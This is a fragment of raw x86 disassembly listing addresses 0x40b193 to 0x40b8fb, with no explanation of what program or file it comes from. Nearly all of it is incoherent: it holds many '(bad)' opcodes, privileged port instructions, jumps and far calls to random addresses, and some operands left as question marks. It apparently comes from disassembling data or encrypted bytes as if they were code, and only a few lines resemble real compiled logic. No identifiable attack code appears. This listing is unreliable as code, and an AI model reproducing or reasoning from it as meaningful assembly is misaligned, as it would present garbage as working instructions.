  40b193:	ins    DWORD PTR es:[edi],dx
  40b194:	fcom   DWORD PTR [edx]
  40b196:	inc    edi
  40b197:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b198:	sub    BYTE PTR [eax+eax*8],bl
  40b19b:	mov    bh,0x30
  40b19d:	pop    ebx
  40b19e:	loopne 0x40b186
  40b1a0:	pusha  
  40b1a1:	(bad)  
  40b1a2:	sub    ebp,DWORD PTR [ebx+0x5]
  40b1a5:	fucomi st,st(3)
  40b1a7:	jg     0x40b1c8
  40b1a9:	repnz push ebx
  40b1ab:	retf   0x8cdf
  40b1ae:	push   ebx
  40b1af:	call   0x400d78e8
  40b1b4:	and    DWORD PTR [ebx-0x72],0xbbb88840
  40b1bb:	sub    eax,0x71d2114f
  40b1c0:	or     DWORD PTR [ebp+0x428a5e5c],ecx
  40b1c6:	pop    edi
  40b1c7:	jge    0x40b23a
  40b1c9:	out    dx,al
  40b1ca:	or     BYTE PTR [ecx+0x354ae195],bh
  40b1d0:	xor    bl,BYTE PTR [ebx]
  40b1d2:	test   DWORD PTR [edi-0x58],eax
  40b1d5:	fldcw  WORD PTR [ebx-0x7b]
  40b1d8:	das    
  40b1d9:	or     DWORD PTR [edi],edx
  40b1db:	mov    fs:0x5a9a0e20,al
  40b1e1:	mov    dh,0x57
  40b1e3:	or     BYTE PTR [edx],dl
  40b1e5:	and    bh,BYTE PTR [ebx-0xb]
  40b1e8:	push   edi
  40b1e9:	cmp    ch,BYTE PTR [ebx-0x11445ce3]
  40b1ef:	ret    
  40b1f0:	stos   DWORD PTR es:[edi],eax
  40b1f1:	es callw 0x1b45
  40b1f6:	jg     0x40b1ec
  40b1f8:	shr    edi,1
  40b1fa:	jae    0x40b184
  40b1fc:	push   esi
  40b1fd:	test   edx,esp
  40b1ff:	(bad)  
  40b200:	inc    eax
  40b201:	mov    cl,BYTE PTR [ecx]
  40b203:	fist   WORD PTR ds:0x7deaec24
  40b209:	xlat   BYTE PTR ds:[ebx]
  40b20a:	in     al,dx
  40b20b:	add    ah,BYTE PTR [ebp-0x16]
  40b20e:	fwait
  40b20f:	xor    DWORD PTR [edx-0x5b42286d],esp
  40b215:	mov    al,ds:0xdeec67c9
  40b21a:	or     eax,0x6ad3d399
  40b21f:	mov    dh,0xbb
  40b221:	pop    ss
  40b222:	lds    esp,FWORD PTR [edi]
  40b224:	xchg   ecx,eax
  40b225:	mov    WORD PTR [eax+0x7cc5e8d7],ss
  40b22b:	std    
  40b22c:	pop    ebp
  40b22d:	mov    esi,DWORD PTR [eax]
  40b22f:	ret    
  40b230:	add    eax,0x89454a73
  40b235:	fistp  WORD PTR [ecx+0x70]
  40b238:	ss retf 0x3d9c
  40b23c:	push   esp
  40b23d:	xchg   edx,eax
  40b23e:	xchg   esp,eax
  40b23f:	and    DWORD PTR [edx+0x290b3110],ebx
  40b245:	popf   
  40b246:	(bad)  
  40b247:	adc    eax,0xfa02902f
  40b24c:	dec    eax
  40b24d:	fldcw  WORD PTR [esi]
  40b24f:	xchg   ebx,eax
  40b250:	aam    0x8f
  40b252:	cmp    BYTE PTR [ecx],0xbd
  40b255:	sub    bl,al
  40b257:	xor    cl,BYTE PTR [eax]
  40b259:	out    0x43,al
  40b25b:	imul   eax,DWORD PTR [edi+eax*4-0x1563ec80],0x328092c8
  40b266:	mov    ds:0xd8308b49,al
  40b26b:	ret    0x3156
  40b26e:	dec    esi
  40b26f:	mov    al,ds:0x54c2825f
  40b274:	inc    eax
  40b275:	into   
  40b276:	sbb    esp,ecx
  40b278:	or     ah,ch
  40b27a:	ins    BYTE PTR es:[edi],dx
  40b27b:	int3   
  40b27c:	lea    ecx,[eax]
  40b27e:	int3   
  40b27f:	mov    esi,0x8be8c52f
  40b284:	sbb    al,0x2b
  40b286:	inc    edi
  40b287:	in     al,0x53
  40b289:	xchg   esi,eax
  40b28a:	sub    ebx,DWORD PTR [ebx-0x24cfadf1]
  40b290:	mov    dl,ah
  40b292:	call   0x41d9:0xf76c0f17
  40b299:	mov    ecx,DWORD PTR [edi-0x60]
  40b29c:	or     al,0xda
  40b29f:	retf   
  40b2a0:	cs mov ecx,0xa23e41eb
  40b2a6:	jo     0x40b2ea
  40b2a8:	jo     0x40b29f
  40b2aa:	pop    esi
  40b2ab:	mov    eax,ds:0x3d46bfce
  40b2b0:	outs   dx,BYTE PTR ds:[esi]
  40b2b1:	mov    ecx,0x3aacd990
  40b2b6:	sahf   
  40b2b7:	repz call 0x8be86819
  40b2bd:	cmp    al,0xf6
  40b2bf:	jbe    0x40b325
  40b2c1:	dec    ebp
  40b2c2:	inc    edi
  40b2c3:	dec    ebx
  40b2c4:	ficom  DWORD PTR [edx]
  40b2c6:	mov    dl,0x18
  40b2c8:	mov    esp,0x3ca7cdcf
  40b2cd:	pop    edx
  40b2ce:	in     eax,0xc0
  40b2d0:	je     0x40b27e
  40b2d2:	mov    ah,0x7b
  40b2d4:	pop    edi
  40b2d5:	xor    DWORD PTR [edi],esp
  40b2d7:	sbb    eax,0xb80fbd70
  40b2dc:	fistp  WORD PTR [ecx-0x432ef3e8]
  40b2e2:	dec    edx
  40b2e3:	es or  eax,0xe58d0a9
  40b2e9:	addr16 and al,0xfa
  40b2ec:	(bad)  
  40b2ed:	jae    0x40b2e4
  40b2ef:	out    0xa2,al
  40b2f1:	out    dx,eax
  40b2f2:	out    dx,al
  40b2f3:	fisttp WORD PTR [edi]
  40b2f5:	dec    ebp
  40b2f6:	js     0x40b35b
  40b2f8:	clc    
  40b2f9:	sahf   
  40b2fa:	sbb    eax,0xa4736285
  40b2ff:	out    0xc8,al
  40b301:	xor    DWORD PTR [ebp-0x7b],ebp
  40b304:	sti    
  40b305:	inc    ebx
  40b306:	stc    
  40b307:	aas    
  40b308:	into   
  40b309:	(bad)  
  40b30b:	(bad)  
  40b30c:	fwait
  40b30d:	nop
  40b30e:	ret    
  40b30f:	jno    0x40b356
  40b311:	(bad)  
  40b312:	retf   
  40b313:	cmc    
  40b314:	dec    ecx
  40b315:	mov    al,ds:0xee757bdc
  40b31a:	push   ss
  40b31b:	popf   
  40b31c:	xor    BYTE PTR [eax],0x35
  40b31f:	add    al,0xf3
  40b321:	in     eax,dx
  40b322:	push   edi
  40b323:	test   BYTE PTR [ebx+0x137b7ca4],dl
  40b329:	clc    
  40b32a:	loopne 0x40b32d
  40b32c:	repz mov esi,0x555e63ff
  40b332:	sub    al,0x48
  40b334:	nop
  40b335:	lods   al,BYTE PTR ds:[esi]
  40b336:	test   al,0x76
  40b338:	jb     0x40b3a3
  40b33a:	mov    ds:0xdf3a1ebc,al
  40b33f:	ins    BYTE PTR es:[edi],dx
  40b340:	and    dl,BYTE PTR [ecx-0x3d2fd001]
  40b346:	aaa    
  40b347:	and    ch,ah
  40b349:	push   ds
  40b34a:	test   DWORD PTR [esi+0x34],esi
  40b34d:	clc    
  40b34e:	xchg   esp,eax
  40b34f:	cdq    
  40b350:	pop    ds
  40b351:	dec    edi
  40b352:	mov    esi,0x621d9ebd
  40b357:	pop    esp
  40b358:	aad    0x2f
  40b35a:	rol    ecx,0x3
  40b35d:	pop    edi
  40b35e:	jbe    0x40b3a5
  40b360:	adc    edx,edx
  40b362:	dec    esi
  40b363:	sbb    BYTE PTR [edi],bl
  40b365:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b366:	pop    eax
  40b367:	cld    
  40b368:	dec    esi
  40b369:	dec    esi
  40b36a:	in     eax,dx
  40b36b:	jbe    0x40b3b9
  40b36d:	addr16 and al,0x45
  40b370:	adc    al,0xa6
  40b372:	pusha  
  40b373:	mov    ah,0x79
  40b375:	paddb  mm6,QWORD PTR [edi]
  40b378:	mov    al,0xbd
  40b37a:	cmp    ebx,edi
  40b37c:	pop    ds
  40b37d:	push   ds
  40b37e:	scas   al,BYTE PTR es:[edi]
  40b37f:	clc    
  40b380:	scas   al,BYTE PTR es:[edi]
  40b381:	(bad)  
  40b382:	cdq    
  40b383:	popa   
  40b384:	jnp    0x40b3ff
  40b386:	nop
  40b387:	add    DWORD PTR [ebp+0x7aef4aaf],eax
  40b38d:	fnsave [ebx]
  40b38f:	jp     0x40b3e7
  40b391:	mov    ds:0x90f86fb,al
  40b396:	jne    0x40b383
  40b398:	lea    ebx,[esi]
  40b39a:	mov    ebp,0x359f503e
  40b39f:	repz popf 
  40b3a1:	out    dx,eax
  40b3a2:	bnd jge 0x40b333
  40b3a5:	add    DWORD PTR [ebp+ebp*1+0x56],edx
  40b3a9:	xchg   BYTE PTR [ecx+0x3a],bl
  40b3ac:	jl     0x40b36e
  40b3ae:	mov    eax,ds:0xd61cc1e9
  40b3b3:	sar    eax,0x17
  40b3b6:	test   DWORD PTR [eax+0x52ed08e9],edx
  40b3bc:	xor    edx,DWORD PTR [ebp-0x3bbc8396]
  40b3c2:	add    BYTE PTR [esi+0x41],dh
  40b3c5:	retf   0xfcf9
  40b3c8:	mov    ecx,0x43a1cf04
  40b3cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3ce:	sub    ecx,ebp
  40b3d0:	dec    ebp
  40b3d1:	neg    DWORD PTR [eax-0x38]
  40b3d4:	xchg   ebx,eax
  40b3d5:	ret    
  40b3d6:	mov    al,ds:0x2c30b33c
  40b3db:	repz mov esp,0xbef25805
  40b3e1:	neg    BYTE PTR [ecx]
  40b3e3:	shr    DWORD PTR [esi+ebx*2-0x48ecaed9],0x1b
  40b3eb:	cmp    al,0x23
  40b3ed:	out    dx,eax
  40b3ee:	or     al,0x4f
  40b3f0:	jo     0x40b45b
  40b3f2:	inc    edx
  40b3f3:	jmp    0x40b3ba
  40b3f5:	xor    al,0x47
  40b3f7:	xchg   edx,eax
  40b3f8:	fldenv [esi+0x24]
  40b3fb:	jno    0x40b3f2
  40b3fd:	jmp    0x40b442
  40b3ff:	push   0x4ac2299e
  40b404:	loopne 0x40b44c
  40b406:	fxrstor [ecx]
  40b409:	adc    BYTE PTR [edi+0x257ec2f8],ch
  40b40f:	imul   esp,DWORD PTR [esi],0x2a244582
  40b415:	jecxz  0x40b489
  40b417:	adc    eax,0x83c68d1a
  40b41c:	add    dl,cl
  40b41e:	mov    eax,0x45d9dfb8
  40b423:	shr    ebp,cl
  40b425:	ror    DWORD PTR [ebx-0x45f8b090],1
  40b42b:	outs   dx,DWORD PTR ds:[esi]
  40b42c:	call   0xfa44b19a
  40b431:	mov    ah,0x52
  40b433:	call   0xb88656b4
  40b438:	sub    ch,BYTE PTR [ebx-0x6850f6b8]
  40b43e:	rol    DWORD PTR [ebx],1
  40b440:	dec    ebx
  40b441:	xchg   edx,eax
  40b442:	xchg   ebp,eax
  40b443:	rcl    BYTE PTR [edi+0x4f],cl
  40b446:	icebp  
  40b447:	xchg   BYTE PTR [eax],cl
  40b449:	sbb    al,BYTE PTR ds:0x8c04bf1e
  40b44f:	fcomi  st,st(5)
  40b451:	test   BYTE PTR [esi-0x6a6d7bf],0xf
  40b458:	int    0xd4
  40b45a:	bound  eax,QWORD PTR [ebp-0xd]
  40b45d:	jle    0x40b478
  40b45f:	push   ss
  40b460:	push   cs
  40b461:	lds    esi,FWORD PTR [esi+0x62ff6f4c]
  40b467:	mov    cl,0xba
  40b469:	mov    bl,0x35
  40b46b:	ja     0x40b3f2
  40b46d:	call   0x3e0b:0xd114d0eb
  40b474:	inc    ebp
  40b475:	pop    ecx
  40b476:	cmp    esi,DWORD PTR [ebp+0x13373d7]
  40b47c:	cmc    
  40b47d:	and    dl,BYTE PTR [eax+0x92a0aec]
  40b483:	xchg   edi,eax
  40b484:	setge  BYTE PTR [ecx]
  40b487:	std    
  40b488:	arpl   WORD PTR [eax+0x79],bp
  40b48b:	pushf  
  40b48c:	into   
  40b48d:	call   0xc787:0xff6c3a84
  40b494:	stos   BYTE PTR es:[edi],al
  40b495:	xor    BYTE PTR [ebx-0x7851aabf],cl
  40b49b:	jnp    0x40b41f
  40b49d:	imul   ebp,DWORD PTR [esi-0x6d979299],0xffffffca
  40b4a4:	pop    esi
  40b4a5:	(bad)  
  40b4a6:	pop    edx
  40b4a7:	and    cl,BYTE PTR [eax-0x6aa7d24a]
  40b4ad:	and    DWORD PTR [edx],edi
  40b4af:	sub    ebx,ebx
  40b4b1:	int    0x44
  40b4b3:	fmul   DWORD PTR [eax-0x5c]
  40b4b6:	pop    esp
  40b4b7:	lea    edx,[ecx]
  40b4b9:	add    al,ch
  40b4bb:	sub    ebp,DWORD PTR [ebx]
  40b4bd:	ds cmp ch,ah
  40b4c0:	test   eax,0x9afd21a2
  40b4c5:	lods   eax,DWORD PTR ds:[esi]
  40b4c6:	out    dx,eax
  40b4c7:	pop    es
  40b4c8:	add    ah,BYTE PTR [edi+eax*1-0x457dac70]
  40b4cf:	clc    
  40b4d0:	push   0x54
  40b4d2:	push   0x3d44c03a
  40b4d7:	in     al,0xb2
  40b4d9:	cmc    
  40b4da:	icebp  
  40b4db:	mov    ebp,0x501e2069
  40b4e0:	push   ebp
  40b4e1:	jbe    0x40b55e
  40b4e3:	jns    0x40b562
  40b4e5:	inc    ecx
  40b4e6:	out    dx,al
  40b4e7:	es clc 
  40b4e9:	and    al,BYTE PTR [esi-0x2b]
  40b4ec:	dec    esi
  40b4ed:	les    eax,FWORD PTR [ebx-0x3de77130]
  40b4f3:	jg     0x40b48a
  40b4f5:	sub    edx,DWORD PTR [ebx-0xc]
  40b4f8:	repnz and BYTE PTR [esp+ebx*1],0x3b
  40b4fd:	cmp    BYTE PTR [ebp-0x56df0d29],al
  40b503:	xlat   BYTE PTR ds:[ebx]
  40b504:	out    0x2f,eax
  40b506:	ret    
  40b507:	ret    
  40b508:	pushf  
  40b509:	push   ebp
  40b50a:	scas   eax,DWORD PTR es:[edi]
  40b50b:	shl    DWORD PTR [ebx],1
  40b50d:	cmp    eax,0x7e594b46
  40b512:	and    eax,0xb8a229d7
  40b517:	jns    0x40b4fa
  40b519:	leave  
  40b51a:	dec    ebp
  40b51b:	and    BYTE PTR [ecx+0x2b],al
  40b51e:	fmul   DWORD PTR [ebp-0x742850f1]
  40b524:	jge    0x40b51e
  40b526:	mov    ebx,DWORD PTR [ebp-0x10]
  40b529:	sub    ebx,edi
  40b52b:	cmp    ebx,edx
  40b52d:	ja     0x40b53b
  40b533:	mov    edx,DWORD PTR [ebp-0x2c]
  40b536:	jmp    0x40c0ee
  40b53b:	mov    edx,DWORD PTR [ebp-0x34]
  40b53e:	jmp    0x40b8fc
  40b543:	cmp    eax,0x7178931c
  40b548:	mov    bh,0x49
  40b54a:	loope  0x40b546
  40b54c:	loop   0x40b5b2
  40b54e:	pop    edx
  40b54f:	add    BYTE PTR [ebp+0x5f],dl
  40b552:	adc    eax,ecx
  40b554:	xchg   BYTE PTR [eax+0x70],dh
  40b557:	lahf   
  40b558:	jge    0x40b5ca
  40b55a:	jo     0x40b4f7
  40b55c:	adc    DWORD PTR [eax+ebx*1-0x28374a61],0x7b
  40b564:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b565:	outs   dx,BYTE PTR ds:[esi]
  40b566:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b567:	leave  
  40b568:	mov    bh,BYTE PTR [ebx]
  40b56a:	xchg   DWORD PTR [edx+0x10bf026],ecx
  40b570:	ror    BYTE PTR [edx+0x70],cl
  40b573:	fistp  DWORD PTR [ecx+ebp*1]
  40b576:	push   esi
  40b577:	mov    dl,0x13
  40b579:	sbb    DWORD PTR [ebx-0x1b],esi
  40b57c:	jno    0x40b5e6
  40b57e:	xor    cl,BYTE PTR ss:[ebp-0x432a7fd7]
  40b585:	ss test eax,0xa3007c84
  40b58b:	sar    BYTE PTR [esi-0x507c21df],1
  40b591:	cmovns esp,DWORD PTR [edx-0x44a5f060]
  40b598:	rcr    BYTE PTR [edx-0x390d6bf],cl
  40b59e:	sbb    eax,0xaf878e13
  40b5a3:	sub    eax,DWORD PTR [edi+eiz*1]
  40b5a6:	mov    ds,WORD PTR [eax+ebp*1]
  40b5a9:	stc    
  40b5aa:	sbb    BYTE PTR [edx-0x16],al
  40b5ad:	jg     0x40b629
  40b5af:	mov    ebp,0xd01319c8
  40b5b4:	ja     0x40b5f0
  40b5b6:	and    DWORD PTR ds:0x6cfa2704,edx
  40b5bc:	imul   edi,DWORD PTR [ecx+0x59],0xffffffd6
  40b5c0:	push   ebp
  40b5c1:	or     ecx,esp
  40b5c3:	push   ds
  40b5c4:	fwait
  40b5c5:	loope  0x40b63b
  40b5c7:	ins    DWORD PTR es:[edi],dx
  40b5c8:	jo     0x40b56d
  40b5ca:	retf   0x5383
  40b5cd:	add    dh,BYTE PTR [edx-0x30]
  40b5d0:	(bad)
  40b5d3:	inc    esi
  40b5d4:	clc    
  40b5d5:	repz xchg ebx,eax
  40b5d7:	and    edi,DWORD PTR [ebx-0x37]
  40b5da:	inc    esi
  40b5db:	mov    eax,ds:0x97fc7d53
  40b5e0:	jb     0x40b58f
  40b5e2:	je     0x40b5d1
  40b5e4:	sbb    dl,dh
  40b5e6:	dec    edx
  40b5e7:	aam    0xcb
  40b5e9:	sti    
  40b5ea:	xchg   edx,eax
  40b5eb:	sub    DWORD PTR [ecx+eax*4],edx
  40b5ee:	jb     0x40b65a
  40b5f0:	xor    DWORD PTR [esi+0x6ce973],esi
  40b5f6:	or     eax,0xaebf05d8
  40b5fb:	mov    edx,0x55006419
  40b600:	and    eax,0x1647e898
  40b605:	dec    ebp
  40b606:	rcr    DWORD PTR ds:0xfee88ac6,0x34
  40b60d:	fs das 
  40b60f:	mov    ch,0xa3
  40b611:	sti    
  40b612:	inc    ebp
  40b613:	and    DWORD PTR [ebx+ecx*2-0x50f987b],esp
  40b61a:	dec    edx
  40b61b:	sub    dl,BYTE PTR [ebx+0x3b]
  40b61e:	and    edi,esi
  40b620:	sub    eax,DWORD PTR [esp+edi*8]
  40b623:	adc    ecx,edx
  40b625:	mov    dh,0x7
  40b627:	mov    bh,0x5b
  40b629:	jle    0x40b689
  40b62b:	add    eax,0x2f4e615b
  40b630:	jo     0x40b69d
  40b632:	leave  
  40b633:	lods   al,BYTE PTR ds:[esi]
  40b634:	mov    dl,0xb8
  40b636:	mov    cl,0xd6
  40b638:	lea    esi,[ecx+ebp*4+0x6155a9fd]
  40b63f:	(bad)  
  40b640:	lahf   
  40b641:	sub    al,dh
  40b643:	mov    ah,0xde
  40b645:	adc    BYTE PTR [ebx+ebp*2+0x2ae4ff96],ch
  40b64c:	mov    edx,0x51906eb3
  40b651:	adc    cl,BYTE PTR [edi-0x7a]
  40b654:	sub    BYTE PTR [ecx],dh
  40b656:	gs jns 0x40b612
  40b659:	fst    QWORD PTR [ebp-0x4f]
  40b65c:	mov    cl,0x97
  40b65e:	in     al,0x5f
  40b660:	std    
  40b661:	jl     0x40b625
  40b663:	inc    ecx
  40b664:	(bad)  
  40b665:	out    dx,al
  40b666:	jecxz  0x40b664
  40b668:	int3   
  40b669:	clc    
  40b66a:	mov    ch,0xfa
  40b66c:	cmp    edx,edx
  40b66e:	xchg   edx,eax
  40b66f:	and    al,0x3f
  40b671:	jo     0x40b6ca
  40b673:	mov    ebx,?
  40b675:	jne    0x40b6d2
  40b677:	jmp    0x40b657
  40b679:	icebp  
  40b67a:	pop    edi
  40b67b:	and    al,0x8a
  40b67d:	jbe    0x40b6b8
  40b67f:	mov    WORD PTR [edx-0x4e],?
  40b682:	push   esp
  40b683:	fdivp  st(5),st
  40b685:	adc    DWORD PTR [edx+0x15c05a8d],0xbe69827e
  40b68f:	and    DWORD PTR [esi],0xfaa39e7b
  40b695:	add    al,0x22
  40b697:	dec    edi
  40b698:	jmp    0x242b416b
  40b69d:	shl    bl,0x41
  40b6a0:	mov    cl,BYTE PTR [edi-0x7c]
  40b6a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6a4:	sub    DWORD PTR [esi],eax
  40b6a6:	clc    
  40b6a7:	mov    WORD PTR [esi-0x11c19ccd],ss
  40b6ad:	dec    DWORD PTR [ebx+0x5322f2d1]
  40b6b3:	sti    
  40b6b4:	int3   
  40b6b5:	mov    WORD PTR [esi],0xcdcd
  40b6ba:	or     al,BYTE PTR [eax]
  40b6bc:	push   ds
  40b6bd:	jns    0x40b674
  40b6bf:	xchg   DWORD PTR [ecx],esi
  40b6c1:	cwde   
  40b6c2:	xor    DWORD PTR [ebx+esi*4+0x7470d0c5],0xce320546
  40b6cd:	sub    eax,0xcbf12705
  40b6d2:	shl    DWORD PTR [edi+0x57c95331],0xfb
  40b6d9:	js     0x40b6bd
  40b6db:	ret    
  40b6dc:	and    DWORD PTR [edi+esi*1],ecx
  40b6df:	and    eax,0xfeb3b433
  40b6e4:	ins    DWORD PTR es:[edi],dx
  40b6e5:	call   0x7ca8f57e
  40b6ea:	xor    BYTE PTR [ecx-0x20146d69],bl
  40b6f0:	out    dx,al
  40b6f1:	popa   
  40b6f2:	cs mov esi,gs
  40b6f5:	mov    bl,0xa1
  40b6f7:	push   ebp
  40b6f8:	dec    edx
  40b6f9:	cmc    
  40b6fa:	inc    ebp
  40b6fb:	ds jg  0x40b682
  40b6fe:	mov    eax,ds:0x645d6364
  40b703:	stc    
  40b704:	ja     0x40b6fb
  40b706:	push   ecx
  40b707:	sub    DWORD PTR [ecx-0x3d],edi
  40b70a:	xor    cl,BYTE PTR [ebx+0x60]
  40b70d:	ret    0xe35d
  40b710:	jmp    0x1ba829ac
  40b715:	mov    edx,0x3a28c87a
  40b71a:	push   esp
  40b71b:	pusha  
  40b71c:	mov    al,ds:0x39110719
  40b721:	push   edx
  40b722:	push   cs
  40b723:	and    ecx,DWORD PTR [edi-0x7252999e]
  40b729:	mov    dh,0xe8
  40b72b:	jp     0x40b6e5
  40b72d:	push   edx
  40b72e:	push   eax
  40b72f:	sub    DWORD PTR [eax],edx
  40b731:	pop    es
  40b732:	or     al,0xf8
  40b734:	mov    bh,0x3f
  40b736:	pop    esp
  40b737:	stos   BYTE PTR es:[edi],al
  40b738:	push   ebp
  40b739:	loopne 0x40b78b
  40b73b:	inc    eax
  40b73c:	gs push ds
  40b73e:	jl     0x40b78b
  40b740:	adc    DWORD PTR [eax-0x5be0c878],ecx
  40b746:	push   DWORD PTR [ebp-0x52]
  40b749:	imul   ebx,ecx,0xf
  40b74c:	cmc    
  40b74d:	jg     0x40b7a0
  40b74f:	jb     0x40b701
  40b751:	nop
  40b752:	hlt    
  40b753:	jle    0x40b7a2
  40b755:	out    dx,eax
  40b756:	jp     0x40b721
  40b758:	push   ebp
  40b759:	dec    edx
  40b75a:	test   al,0x88
  40b75c:	into   
  40b75d:	add    eax,0xe560cefe
  40b762:	push   ebx
  40b763:	and    al,0x0
  40b765:	jle    0x40b7cb
  40b767:	mov    edx,0x6d7c5dd7
  40b76c:	std    
  40b76d:	dec    eax
  40b76e:	adc    eax,0xa78ebba0
  40b773:	mov    WORD PTR [edx],cs
  40b775:	mov    bl,dl
  40b777:	mov    eax,ds:0x4dd53912
  40b77c:	mov    ch,0x86
  40b77e:	lahf   
  40b77f:	rol    ebp,0x43
  40b782:	sar    ebp,cl
  40b784:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b785:	and    eax,0xc73965c0
  40b78a:	push   ss
  40b78b:	outs   dx,DWORD PTR ds:[esi]
  40b78c:	loop   0x40b7d3
  40b78e:	fcomip st,st(7)
  40b790:	cmc    
  40b791:	mov    edi,0x579154b9
  40b796:	outs   dx,DWORD PTR ds:[esi]
  40b797:	addr16 sub al,0xe3
  40b79a:	mov    BYTE PTR [eax+0x4],0xf7
  40b79e:	dec    esp
  40b79f:	dec    esp
  40b7a0:	inc    ebx
  40b7a1:	scas   al,BYTE PTR es:[edi]
  40b7a2:	xchg   al,ah
  40b7a4:	push   ecx
  40b7a5:	pop    ss
  40b7a6:	mov    bl,0xcd
  40b7a8:	cmp    dh,0x35
  40b7ab:	pop    esi
  40b7ac:	adc    edx,eax
  40b7ae:	xchg   edi,eax
  40b7af:	pop    ecx
  40b7b0:	sub    DWORD PTR [esi+0x7],edi
  40b7b3:	dec    ebx
  40b7b4:	mov    eax,ds:0xc85faba6
  40b7b9:	cmp    al,0xa4
  40b7bb:	test   BYTE PTR [eax+0xb],dh
  40b7be:	mov    edi,0x9d5c7877
  40b7c3:	jo     0x40b7fd
  40b7c5:	bound  esp,QWORD PTR [eax+0x53]
  40b7c8:	(bad)  
  40b7c9:	aam    0xc1
  40b7cb:	lock loope 0x40b783
  40b7ce:	pop    ss
  40b7cf:	mov    edx,0xae0b41d4
  40b7d4:	jo     0x40b7e5
  40b7d6:	cmp    eax,0x34414a7d
  40b7db:	rol    BYTE PTR [ecx+0x620668f1],cl
  40b7e1:	loope  0x40b841
  40b7e3:	jecxz  0x40b828
  40b7e5:	cmp    eax,0xeae4da8e
  40b7ea:	jle    0x40b85f
  40b7ec:	leave  
  40b7ed:	inc    edx
  40b7ee:	dec    eax
  40b7ef:	iret   
  40b7f0:	das    
  40b7f1:	xlat   BYTE PTR ds:[ebx]
  40b7f2:	pop    ds
  40b7f3:	inc    ebp
  40b7f4:	pushf  
  40b7f5:	sbb    eax,ecx
  40b7f7:	(bad)  
  40b7f9:	fiadd  DWORD PTR [ebp+0x4b2070ee]
  40b7ff:	xor    al,0x1
  40b801:	add    ch,BYTE PTR [edi-0x64]
  40b804:	stos   BYTE PTR es:[edi],al
  40b805:	sahf   
  40b806:	push   cs
  40b807:	sub    DWORD PTR [ecx-0x2b],ebx
  40b80a:	int3   
  40b80b:	xor    bl,cl
  40b80d:	fs test al,0xc1
  40b810:	lods   eax,DWORD PTR ds:[esi]
  40b811:	cmp    esp,ecx
  40b813:	dec    edx
  40b814:	repnz add DWORD PTR [eax],ecx
  40b817:	(bad)  
  40b818:	idiv   DWORD PTR [edx-0x5740578e]
  40b81e:	cmp    ebx,esi
  40b820:	and    al,0x1
  40b822:	scas   eax,DWORD PTR es:[edi]
  40b823:	sub    eax,0x7e7ea32c
  40b828:	out    0x46,eax
  40b82a:	pop    edx
  40b82b:	add    ecx,DWORD PTR ds:0xa59179a1
  40b831:	jge    0x40b806
  40b833:	jmp    0x40b80e
  40b835:	dec    ebp
  40b836:	lea    esi,[edx-0x18]
  40b839:	lods   al,BYTE PTR ds:[esi]
  40b83a:	inc    edi
  40b83b:	push   eax
  40b83c:	jmp    0x9c1dcf14
  40b841:	loopne 0x40b88a
  40b843:	add    al,0xa9
  40b845:	nop
  40b846:	push   esp
  40b847:	and    al,0x56
  40b849:	retf   
  40b84a:	fwait
  40b84b:	xchg   ecx,eax
  40b84c:	xor    al,0x1
  40b84e:	mov    bh,0xdc
  40b850:	mov    bl,0xc1
  40b852:	out    dx,eax
  40b853:	push   ebp
  40b854:	fmul   DWORD PTR [edx+0x3c]
  40b857:	cmp    cl,BYTE PTR [eax+0x38]
  40b85a:	inc    edi
  40b85b:	ret    
  40b85c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b85d:	test   esi,eax
  40b85f:	cmc    
  40b860:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b861:	and    ch,dh
  40b863:	or     esi,ecx
  40b865:	mov    al,0x99
  40b867:	mov    ebp,0xd791ae0d
  40b86c:	pop    ecx
  40b86d:	sub    esp,esp
  40b86f:	aam    0x5d
  40b871:	mov    al,0xd8
  40b873:	out    0xe4,al
  40b875:	popa   
  40b876:	xchg   ecx,eax
  40b877:	push   esi
  40b878:	or     ecx,DWORD PTR [eax-0x79f8425a]
  40b87e:	inc    eax
  40b87f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b880:	std    
  40b881:	jecxz  0x40b8a5
  40b883:	imul   ebx,DWORD PTR [ebp-0x7c],0xbf114ad2
  40b88a:	and    ecx,eax
  40b88c:	pop    edi
  40b88d:	iret   
  40b88e:	jmp    0xe0ff:0x4b15ae2b
  40b895:	push   eax
  40b896:	push   eax
  40b897:	adc    BYTE PTR [ebx-0x4],0xa
  40b89b:	imul   dh
  40b89d:	pop    esp
  40b89e:	mov    eax,fs
  40b8a0:	es sbb ah,dh
  40b8a3:	pop    ss
  40b8a4:	push   0xcc9251f3
  40b8a9:	cmc    
  40b8aa:	inc    ebx
  40b8ab:	cmp    DWORD PTR [esp+eiz*2],edi
  40b8ae:	stos   BYTE PTR es:[edi],al
  40b8af:	in     eax,dx
  40b8b0:	xchg   esi,eax
  40b8b1:	loopne 0x40b870
  40b8b3:	sbb    dh,bh
  40b8b5:	gs (bad) 
  40b8b7:	jge    0x40b8b5
  40b8b9:	in     eax,dx
  40b8ba:	xchg   edi,eax
  40b8bb:	cs addr16 jb 0x40b8c6
  40b8bf:	mov    BYTE PTR fs:[edx],bl
  40b8c2:	jmp    0x40b8c5
  40b8c4:	sub    DWORD PTR [edx-0x35],edi
  40b8c7:	mov    dl,0x10
  40b8c9:	fxch   st(1)
  40b8cb:	outs   dx,BYTE PTR ds:[esi]
  40b8cc:	lods   al,BYTE PTR ds:[esi]
  40b8cd:	adc    dh,BYTE PTR ds:0xecc519ea
  40b8d3:	shr    DWORD PTR [esi],0xf8
  40b8d6:	push   cs
  40b8d7:	sub    BYTE PTR [ecx-0xf],bh
  40b8da:	sub    al,0x15
  40b8dc:	pop    ds
  40b8dd:	jne    0x40b88c
  40b8df:	jo     0x40b8fc
  40b8e1:	jp     0x40b947
  40b8e3:	push   ecx
  40b8e4:	pop    ebp
  40b8e5:	mov    dh,0x2
  40b8e7:	sub    bh,BYTE PTR [edi-0x449363e]
  40b8ed:	inc    eax
  40b8ee:	sahf   
  40b8ef:	jmp    0x58fd15c
  40b8f4:	xor    al,0xb4
  40b8f6:	mov    ds:0xc68edcc1,al
  40b8fb:	loopne 0x40b888
